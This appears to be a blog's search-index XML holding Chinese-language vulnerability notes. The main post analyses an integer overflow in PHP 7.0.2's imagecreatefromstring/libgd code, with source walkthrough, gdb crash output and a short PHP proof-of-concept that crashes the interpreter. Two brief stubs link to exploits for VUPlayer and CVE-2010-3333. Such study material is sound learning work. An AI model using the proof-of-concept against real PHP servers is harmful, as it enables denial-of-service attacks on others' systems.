<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[stack-based integer overflow]]></title>
      <url>http://yoursite.com/2017/02/16/stack-based-integer-overflow/</url>
      <content type="html"><![CDATA[<h1 id="Stack-based-integer-overlow（php漏洞挖掘系列之一）"><a href="#Stack-based-integer-overlow（php漏洞挖掘系列之一）" class="headerlink" title="Stack-based integer overlow（php漏洞挖掘系列之一）"></a>Stack-based integer overlow（php漏洞挖掘系列之一）</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>首先声明这些漏洞不是我挖的，我想挖但是挖不出来，蛋疼。本次讲解栈溢出漏洞，这个漏洞是比较常见的漏洞，现在不太好挖了，变量跟踪的你头痛死，没有啥好工具，只能人工慢慢的看，可能我孤陋寡闻吧。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>首先下载源码<a href="http://php.net/releases/，然后编译安装，版本可以低一点，往后的漏洞这个版本都是没打补丁的。环境采用ubuntu和编译版本的php7.0.2，只有linux才有符号表，windows下不好调试，虽然方便的多。现在正式开始吧。" target="_blank" rel="external">http://php.net/releases/，然后编译安装，版本可以低一点，往后的漏洞这个版本都是没打补丁的。环境采用ubuntu和编译版本的php7.0.2，只有linux才有符号表，windows下不好调试，虽然方便的多。现在正式开始吧。</a></p>
<p>定位到漏洞函数代码 /ext/gd/gd.c:2222<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">PHP_FUNCTION(imagecreatefromstring)</div><div class="line">&#123;</div><div class="line">         zval *data;</div><div class="line">         gdImagePtr im;</div><div class="line">         int imtype;</div><div class="line">         char sig[8];</div><div class="line"> </div><div class="line">         if (zend_parse_parameters(ZEND_NUM_ARGS(), &quot;z&quot;, &amp;data) == FAILURE) &#123;</div><div class="line">                   return;</div><div class="line">         &#125;</div><div class="line">         convert_to_string_ex(data);</div><div class="line">         if (Z_STRLEN_P(data) &lt; 8) &#123;</div><div class="line">                   php_error_docref(NULL, E_WARNING, &quot;Empty string or invalid image&quot;);</div><div class="line">                   RETURN_FALSE;</div><div class="line">         &#125;</div><div class="line">         memcpy(sig, Z_STRVAL_P(data), 8);</div><div class="line">         imtype = _php_image_type(sig);</div><div class="line">         switch (imtype) &#123;</div><div class="line">                   case PHP_GDIMG_TYPE_JPG:</div><div class="line">#ifdef HAVE_GD_JPG</div><div class="line">                            im = _php_image_create_from_string(data, &quot;JPEG&quot;, gdImageCreateFromJpegCtx);</div><div class="line">#else</div><div class="line">                            php_error_docref(NULL, E_WARNING, &quot;No JPEG support in this PHP build&quot;);</div><div class="line">                            RETURN_FALSE;</div><div class="line">#endif</div><div class="line">                            break;</div><div class="line">                   case PHP_GDIMG_TYPE_PNG:</div><div class="line">#ifdef HAVE_GD_PNG</div><div class="line">                            im = _php_image_create_from_string(data, &quot;PNG&quot;, gdImageCreateFromPngCtx);</div><div class="line">#else</div><div class="line">                            php_error_docref(NULL, E_WARNING, &quot;No PNG support in this PHP build&quot;);</div><div class="line">                            RETURN_FALSE;</div><div class="line">#endif</div><div class="line">                            break;</div><div class="line">                   case PHP_GDIMG_TYPE_GIF:</div><div class="line">                            im = _php_image_create_from_string(data, &quot;GIF&quot;, gdImageCreateFromGifCtx);</div><div class="line">                            break;</div><div class="line">                   case PHP_GDIMG_TYPE_WBM:</div><div class="line">                            im=_php_image_create_from_string(data,&quot;WBMP&quot;, gdImageCreateFromWBMPCtx);</div><div class="line">                            break；</div><div class="line">                   case PHP_GDIMG_TYPE_GD2:</div><div class="line">                            im = _php_image_create_from_string(data, &quot;GD2&quot;, gdImageCreateFromGd2Ctx);</div><div class="line">                            break;</div><div class="line">                   default:</div><div class="line">                            php_error_docref(NULL, E_WARNING, &quot;Data is not in a recognized format&quot;);</div><div class="line">                            RETURN_FALSE;</div><div class="line">         &#125;</div><div class="line">         if (!im) &#123;</div><div class="line">                   php_error_docref(NULL, E_WARNING, &quot;Couldn&apos;t create GD Image Stream out of Data&quot;);</div><div class="line">                   RETURN_FALSE;</div><div class="line">         &#125;</div><div class="line">         RETURN_RES(zend_register_resource(im, le_gd));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>有可能上面的代码长了点，但是只要找到关键函数就行了_php_image_create_from_string，在这个函数中的gdNewDynamicCtxEx这个函数才是关键点，跟踪进去就行了。在gd.c:2196行，假如你使用其他版本可能行号不一样，不过没事搜索函数就行了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line">gdImagePtr _php_image_create_from_string(zval *data, char *tn, gdImagePtr (*ioctx_func_p)())</div><div class="line">&#123;</div><div class="line">         gdImagePtr im;</div><div class="line">         gdIOCtx *io_ctx;</div><div class="line">         io_ctx = gdNewDynamicCtxEx(Z_STRLEN_P(data),Z_STRVAL_P(data), 0);  //这边的传入参数的长度为0x80000000  由于是int，所以这边整数溢出。</div><div class="line">………………………………………………………………………………</div><div class="line">gdNewDynamicCtxEx函数代码，行号就不说了。</div><div class="line">gdIOCtx * gdNewDynamicCtxEx (int initialSize, void *data, int freeOKFlag)</div><div class="line">&#123;</div><div class="line">         dpIOCtx *ctx;</div><div class="line">         dynamicPtr *dp;</div><div class="line">         ctx = (dpIOCtx *) gdMalloc (sizeof (dpIOCtx));</div><div class="line">         dp = newDynamic(initialSize, data, freeOKFlag);</div><div class="line">         ctx-&gt;dp = dp; //这边将initialSize 赋值了</div><div class="line">         ctx-&gt;ctx.getC =dynamicGetchar; //这边造成栈溢出，跟踪进去进行了。</div><div class="line">………………………………………………………………………………</div><div class="line"></div><div class="line">newDynamic函数代码</div><div class="line">static dynamicPtr * newDynamic (int initialSize, void *data, int freeOKFlag)</div><div class="line">&#123;</div><div class="line">         dynamicPtr *dp;</div><div class="line">         dp = (dynamicPtr *) gdMalloc (sizeof (dynamicPtr)); // 这边申请了64个字节</div><div class="line">         allocDynamic (dp, initialSize, data);</div><div class="line">………………………………………………………..</div><div class="line">static int</div><div class="line">allocDynamic (dynamicPtr * dp, int initialSize, void *data)</div><div class="line">&#123;</div><div class="line">         if (data == NULL) &#123;</div><div class="line">                   dp-&gt;logicalSize = 0;</div><div class="line">                   dp-&gt;dataGood = FALSE;</div><div class="line">                   dp-&gt;data = gdMalloc(initialSize);  这里的initialSize的值为-2147483648</div><div class="line">         &#125; else &#123;</div><div class="line">                   dp-&gt;logicalSize = initialSize;</div><div class="line">                   dp-&gt;dataGood = TRUE;</div><div class="line">                   dp-&gt;data = data;</div><div class="line">         &#125;</div><div class="line">……………………………………………….</div><div class="line">static int dynamicGetchar (gdIOCtxPtr ctx)</div><div class="line">&#123;</div><div class="line">         unsigned char b;</div><div class="line">         int rv;</div><div class="line">         rv = dynamicGetbuf (ctx, &amp;b, 1);</div><div class="line"> </div><div class="line">………………………………………………………………………………</div><div class="line">static int dynamicGetbuf (gdIOCtxPtr ctx, void *buf, int len)</div><div class="line">&#123;</div><div class="line">         int rlen, remain;</div><div class="line">         dpIOCtxPtr dctx;</div><div class="line">         dynamicPtr *dp;</div><div class="line">         dctx = (dpIOCtxPtr) ctx;</div><div class="line">         dp = dctx-&gt;dp;</div><div class="line">         remain = dp-&gt;logicalSize - dp-&gt;pos;</div><div class="line">         if (remain &gt;= len) &#123;</div><div class="line">                   rlen = len;</div><div class="line">         &#125; else &#123;</div><div class="line">                   if (remain == 0) &#123;</div><div class="line">                            return EOF;</div><div class="line">                   &#125;</div><div class="line">                   rlen = remain;//上面的remain 的值为负数，没有检查，直接比较后赋值，所以导致下面的rlen的值过大造成栈溢出。</div><div class="line">         &#125;</div><div class="line">         memcpy(buf, (void *) ((char *) dp-&gt;data + dp-&gt;pos), rlen); //这边造成了栈溢出</div></pre></td></tr></table></figure></p>
<p>下面是几个结构体，可以对照着去理解代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">typedef struct gdIOCtx &#123;</div><div class="line">         int    (*getC)(struct gdIOCtx*);</div><div class="line">         int    (*getBuf)(struct gdIOCtx*, void*, int);</div><div class="line">         void  (*putC)(struct gdIOCtx*, int);</div><div class="line">         int    (*putBuf)(struct gdIOCtx*, const void*, int);</div><div class="line">         int    (*seek)(struct gdIOCtx*, const int);</div><div class="line">         long (*tell)(struct gdIOCtx*);</div><div class="line">         void  (*gd_free)(struct gdIOCtx*);</div><div class="line">         void  *data;</div><div class="line">&#125; gdIOCtx;</div><div class="line">………………………………………………………………………………</div><div class="line">typedef struct dpStruct</div><div class="line">&#123;</div><div class="line">         void *data;</div><div class="line">         int logicalSize;</div><div class="line">         int realSize;</div><div class="line">         int dataGood;</div><div class="line">         int pos;</div><div class="line">         int freeOK;</div><div class="line">&#125; dynamicPtr;</div><div class="line">………………………………………………………………………………</div><div class="line">typedef struct dpIOCtx</div><div class="line">&#123;</div><div class="line">         gdIOCtx ctx;</div><div class="line">         dynamicPtr *dp;</div><div class="line">&#125; dpIOCtx;</div><div class="line">………………………………………………………………………………</div></pre></td></tr></table></figure></p>
<p>下面是gdb的调试信息,不知道为什么参数的值没有显示出来。有些代码直接阅读比较麻烦，可以gdb调试代码，再调试的同时，打印出它的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">root@mhn:~# gdb -q --args php-7.0.2/sapi/cli/php -n test.php</div><div class="line">Reading symbols from php-7.0.2/sapi/cli/php...done.</div><div class="line">(gdb) r</div><div class="line">Starting program: /root/php-7.0.2/sapi/cli/php -n test.php</div><div class="line">[Thread debugging using libthread_db enabled]</div><div class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</div><div class="line"> </div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">__memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:118</div><div class="line">118  ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.</div><div class="line">(gdb) bt</div><div class="line">#0  __memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:118</div><div class="line">#1  0x000000000059c1cf in memcpy (__len=18446744071562067968, __src=&lt;optimized out&gt;, __dest=&lt;optimized out&gt;) at /usr/include/x86_64-linux-gnu/bits/string3.h:51</div><div class="line">#2  dynamicGetbuf (ctx=&lt;optimized out&gt;, buf=&lt;optimized out&gt;, len=&lt;optimized out&gt;) at /root/php-7.0.2/ext/gd/libgd/gd_io_dp.c:246</div><div class="line">#3  0x000000000059dd05 in php_gd_fill_input_buffer (cinfo=0x7fffffffaa70) at /root/php-7.0.2/ext/gd/libgd/gd_jpeg.c:607</div><div class="line">#4  0x00007ffff73144e6 in ?? () from /usr/lib/x86_64-linux-gnu/libjpeg.so.8</div><div class="line">#5  0x00007ffff73129ca in ?? () from /usr/lib/x86_64-linux-gnu/libjpeg.so.8</div></pre></td></tr></table></figure></p>
<p>poc就放下面了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">ini_set(&apos;memory_limit&apos;,-1);</div><div class="line">$var_3  =  str_repeat(&quot;A&quot;,0x80000000);</div><div class="line">$var_3[0]=&quot;\xff&quot;;</div><div class="line">$var_3[1]=&quot;\xd8&quot;;</div><div class="line">$var_3[2]=&quot;\xff&quot;;</div><div class="line">imagecreatefromstring($var_3);</div></pre></td></tr></table></figure></p>
<p>这边为什么要替换变量的值呢，由于它上面会检查文件头是否为真实的图片。所以我这边用了jpg的文件头，应该是吧，我也忘了啥文件头，反正只要网上搜索一下图片的文件头就行了。</p>
<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>说实话我也是初学者，只能这样写一篇文章了，网上的php底层的漏洞挖掘太少了，就只有应用层的代码审计，希望能够给初学者们帮助吧。如果写的有啥不对的地方欢迎指出。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://bugs.php.net/bug.php?id=73280" target="_blank" rel="external">https://bugs.php.net/bug.php?id=73280</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[vuplayer stack overflow]]></title>
      <url>http://yoursite.com/2016/10/11/vuplayer-stack-overflow/</url>
      <content type="html"><![CDATA[<p>一、漏洞环境<br>vuplayer2.49   win7 32</p>
<p>由于win7 没有找到绕过aslr的方法，但是dep绕过了。</p>
<p><a href="https://github.com/whiteHat001/vuplayer/" target="_blank" rel="external">下载地址</a><br>参考资料:<a href="https://www.exploit-db.com/exploits/40172/" target="_blank" rel="external">https://www.exploit-db.com/exploits/40172/</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[cve-2010-3333调试学习笔记]]></title>
      <url>http://yoursite.com/2016/09/23/cve-2010-3333%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>由于第一次分析，难免会有错误，希望能够指出。<br><a href="https://github.com/whiteHat001/cve-2010-3333" target="_blank" rel="external">下载地址</a><br>参考文档:《漏洞战争》</p>
]]></content>
    </entry>
    
  
  
</search>
